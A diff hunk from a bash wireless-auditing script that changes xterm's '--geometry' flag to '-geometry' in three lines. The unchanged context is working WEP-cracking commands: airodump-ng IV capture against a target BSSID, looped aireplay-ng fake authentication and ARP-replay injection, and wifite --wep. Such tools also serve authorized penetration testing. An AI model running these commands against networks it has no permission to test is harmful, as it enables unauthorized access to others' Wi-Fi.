@@ -434,7 +434,7 @@ do
 		fi
 		WEPFF="/root/handshakes/WEP/$WEPF-01.cap"
 		export WEPFF
-		xterm --geometry 90x15+9999+999999 -T "Capturing IVs" -hold -e "airodump-ng --bssid $TARGB -c $TARGC -w /root/handshakes/WEP/$WEPF $WLANNM && echo -e "" && echo -e 'Close this window manually'" & disown
+		xterm -geometry 90x15+9999+999999 -T "Capturing IVs" -hold -e "airodump-ng --bssid $TARGB -c $TARGC -w /root/handshakes/WEP/$WEPF $WLANNM && echo -e "" && echo -e 'Close this window manually'" & disown
 	elif [[ "$WEP" = "w" ]]
 	then
 		wifite --wep
@@ -454,8 +454,8 @@ do
 			continue
 		fi
 		export MYMAC
-		xterm --geometry 90x50+0+0 -T "FAKE AUTHENTICATION" -hold -e "while true; do aireplay-ng -1 0 -a $TARGB -h $MYMAC $WLANNM; sleep 5; done && echo -e '' && echo -e 'Close this window manually'" & disown
-		xterm --geometry 90x30+0+999999 -T "ARP-REPLAY" -hold -e "while true; do aireplay-ng -3 -b $TARGB -h $MYMAC $WLANNM; done && echo -e '' && echo -e 'Close this windows manually'" & disown
+		xterm -geometry 90x50+0+0 -T "FAKE AUTHENTICATION" -hold -e "while true; do aireplay-ng -1 0 -a $TARGB -h $MYMAC $WLANNM; sleep 5; done && echo -e '' && echo -e 'Close this window manually'" & disown
+		xterm -geometry 90x30+0+999999 -T "ARP-REPLAY" -hold -e "while true; do aireplay-ng -3 -b $TARGB -h $MYMAC $WLANNM; done && echo -e '' && echo -e 'Close this windows manually'" & disown
 	#~ elif [[ "$WEP" = "4" ]]
 	#~ then
 		#~ clear
